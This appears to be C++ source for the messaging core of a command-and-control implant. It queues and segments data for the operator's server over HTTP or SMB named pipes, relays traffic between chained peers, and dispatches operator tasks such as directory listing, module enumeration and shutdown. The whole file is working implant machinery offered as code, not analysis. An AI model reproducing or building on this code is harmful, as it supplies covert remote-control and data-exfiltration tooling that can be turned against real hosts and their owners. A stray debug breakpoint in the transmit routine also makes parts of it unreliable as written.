#include <include/message.hpp>
namespace Message {
    using namespace Commands;
    using namespace Stream;
    using namespace Parser;
    using namespace Smb;

    RDATA_SECTION COMMAND_MAP CmdMap[] = {
        { .Id = CommandDir,         .Function = DirectoryList },
        { .Id = CommandMods,        .Function = ProcessModules },
        { .Id = CommandUpdatePeer,  .Function = UpdatePeer },
        { .Id = CommandShutdown,    .Function = Shutdown },
        { .Id = 0,                  .Function = nullptr }
    };

    BOOL PeekPID(PSTREAM Stream) {
        HEXANE

        UINT Pid = 0;
        x_memcpy(&Pid, Stream->Buffer, 4);

        if (x_memcmp(&Ctx->Session.PeerId, &Pid, 4) == 0) {
            return TRUE;
        } else {
            return FALSE;
        }
    }

    VOID AddMessage(PSTREAM Outbound) {
        HEXANE

        PSTREAM Head = Ctx->Transport.OutboundQueue;

        if (!Ctx->Transport.OutboundQueue) {
            Ctx->Transport.OutboundQueue = Outbound;

        } else {
            while (Head->Next) {
                Head = Head->Next;
            }

            Head->Next = Outbound;
        }
    }

    VOID ClearQueue() {
        HEXANE

        PSTREAM Head = Ctx->Transport.OutboundQueue;
        PSTREAM Swap = { };

        while (Head) {

            Swap = Head->Next;
            if (Head->Ready) {
                DestroyStream(Head);
            }

            Head = Swap;
        }
    }

    VOID OutboundQueue(PSTREAM Outbound) {
        HEXANE

        if (!Outbound) {
            return_defer(ERROR_NO_DATA);
        }

        if (Outbound->Length > MESSAGE_MAX) {
            QueueSegments(B_PTR(Outbound->Buffer), Outbound->Length);
        } else {
            AddMessage(Outbound);
        }

        defer:
        return;
    }

    VOID QueueSegments(PBYTE Buffer, DWORD Length) {
        HEXANE

        PSTREAM Swap    = { };
        DWORD Index     = 1;
        DWORD Offset    = 0;
        DWORD PeerId    = 0;
        DWORD TaskId    = 0;
        DWORD cbSeg     = 0;
        DWORD nSegs     = (Length + MESSAGE_MAX - 1) / MESSAGE_MAX;

        while (Length > 0) {
            cbSeg   = (Length > MESSAGE_MAX - SEGMENT_HEADER_SIZE) ? MESSAGE_MAX - SEGMENT_HEADER_SIZE : Length;
            Swap    = (PSTREAM) Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, cbSeg + SEGMENT_HEADER_SIZE);

            x_memcpy(&PeerId, Buffer, 4);
            x_memcpy(&TaskId, Buffer + 4, 4);

            PackDword(Swap, PeerId);
            PackDword(Swap, TaskId);
            PackDword(Swap, TypeSegment);

            PackDword(Swap, Index);
            PackDword(Swap, nSegs);
            PackDword(Swap, cbSeg);
            PackBytes(Swap, B_PTR(Buffer) + Offset, cbSeg);

            Index++;
            Length -= cbSeg;
            Offset += cbSeg;

            AddMessage(Swap);
        }
    }

    VOID MessageTransmit() {
        HEXANE

        PSTREAM Outbound    = CreateStreamWithHeaders(TypeResponse);
        PSTREAM Inbound     = { };
        PSTREAM Head        = { };
        PSTREAM Swap        = { };

        if (!Ctx->Transport.OutboundQueue) {

#ifdef TRANSPORT_HTTP
            // PackDword(Outbound, 0);
            PackDword(Outbound, Ctx->Session.PeerId);
            PackDword(Outbound, Ctx->Session.CurrentTaskId);
            PackDword(Outbound, TypeTasking);
#else
            return_defer(ERROR_SUCCESS);
#endif
        } else {
            __debugbreak();
            Head = Ctx->Transport.OutboundQueue;

            while (Head) {
                if ((Head->Length + Outbound->Length) > MESSAGE_MAX) {
                    break;
                }

                if (Head->Buffer) {
                    PackBytes(Outbound, B_PTR(Head->Buffer), Head->Length);

                    Outbound->Length += Head->Length;
                    Head->Ready = TRUE;

                } else {
                    return_defer(ERROR_NO_DATA);
                }

                Head = Head->Next;
            }
        }
#ifdef TRANSPORT_HTTP
        HttpCallback(Outbound, &Inbound);
#endif
#ifdef TRANSPORT_PIPE
        PeerConnectEgress(Outbound, &Inbound);
#endif

        DestroyStream(Outbound);
        Outbound = nullptr;

        if (Inbound) {
            ClearQueue();

            if (PeekPID(Inbound)) {
                CommandDispatch(Inbound);
                DestroyStream(Inbound);

            } else {
                Swap = Inbound;
                Inbound = Outbound;
                Outbound = Swap;

                if (Ctx->Config.IngressPipename) {
                    PeerConnectIngress(Outbound, &Inbound);

                    if (Inbound) {
                        OutboundQueue(Inbound);
                    }
                }

                DestroyStream(Outbound);
            }
        } else {
            Head = Ctx->Transport.OutboundQueue;

            while (Head) {
                Head->Ready = FALSE;
                Head = Head->Next;
            }
        }

        defer:
        return;
    }

    VOID CommandDispatch (PSTREAM Inbound) {
        HEXANE

        PARSER Parser   = { };
        DWORD MsgType   = 0;
        DWORD CmdId     = 0;

        CreateParser(&Parser, B_PTR(Inbound->Buffer), Inbound->Length);

        Ctx->Session.PeerId         = UnpackDword(&Parser);
        Ctx->Session.CurrentTaskId  = UnpackDword(&Parser);
        MsgType                     = UnpackDword(&Parser);

        switch (MsgType) {

            case TypeCheckin: {
                Ctx->Session.Checkin = TRUE;
                break;
            }

            case TypeTasking: {
                CmdId = UnpackDword(&Parser);
                if (CmdId == CommandNoJob) {
                    break;
                }

                for (uint32_t FnCounter = 0;; FnCounter++) {
                    if (!CmdMap[FnCounter].Function) {
                        return_defer(ERROR_PROC_NOT_FOUND);
                    }

                    if (CmdMap[FnCounter].Id == CmdId) {
                        auto Cmd = CMD_SIGNATURE(Ctx->Base.Address + U_PTR(CmdMap[FnCounter].Function));
                        Cmd(&Parser);
                        break;
                    }
                }
            }
            default:
                break;
        }

        defer:
        DestroyParser(&Parser);
    }
}